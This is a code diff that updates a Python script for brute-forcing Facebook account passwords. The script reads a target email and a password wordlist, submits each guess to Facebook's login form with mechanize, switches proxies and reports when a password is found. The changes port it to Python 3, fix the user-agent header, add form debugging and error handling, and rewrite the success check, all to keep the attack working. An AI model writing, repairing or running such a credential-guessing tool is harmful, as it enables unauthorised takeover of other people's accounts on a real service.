@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: UTF-8 -*-
 # This Coding is Code in python 2 now it will be renewed soon
 
@@ -15,10 +15,7 @@ passwordlist = str(input("Enter the wordlist name and path: "))
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 
-useragents = [
-    ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
-     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')
-]
+useragent = 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'
 
 def main():
     global br
@@ -30,6 +27,7 @@ def main():
     br.set_handle_equiv(True)
     br.set_handle_referer(True)
     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    br.addheaders = [('User-agent', useragent)]
     welcome()
     search()
     print("Password does not exist in the wordlist")
@@ -37,16 +35,34 @@ def main():
 def brute(password):
     sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
     sys.stdout.flush()
-    br.addheaders = [('User-agent', random.choice(useragents))]
-    site = br.open(login)
-    br.select_form(nr=0)
-    br.form['email'] = email
-    br.form['pass'] = password
-    sub = br.submit()
-    log = sub.geturl()
-    if log != login and ('login_attempt' not in log):
-        print("\n\n[+] Password Found = {}".format(password))
-        input("ANY KEY to Exit....")
+    
+    try:
+        br.addheaders = [('User-agent', useragent)]
+        site = br.open(login)
+        
+        # Print form details for debugging
+        print("\nAvailable forms:")
+        form_found = False
+        for form in br.forms():
+            print(form)
+            form_found = True
+            
+        if not form_found:
+            print("\nWarning: No forms found on the page")
+            return False
+            
+        # Try to select and fill the form
+        br.select_form(nr=0)
+        br.form['email'] = email
+        br.form['pass'] = password
+        response = br.submit()
+        
+        # Check if login was successful
+        return login not in response.geturl()
+        
+    except Exception as e:
+        print(f"\nError: {str(e)}")
+        print("Facebook's security measures are blocking automated access")
         sys.exit(1)
 
 def change_proxy():
@@ -60,7 +76,7 @@ def change_proxy():
     print("[*] Changed proxy to {}".format(proxy))
     sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
     sys.stdout.flush()
-    br.addheaders = [('User-agent', random.choice(useragents))]
+    br.addheaders = [('User-agent', random.choice([useragent]))]
     site = br.open(login)
     br.select_form(nr=0)
     br.form['email'] = email
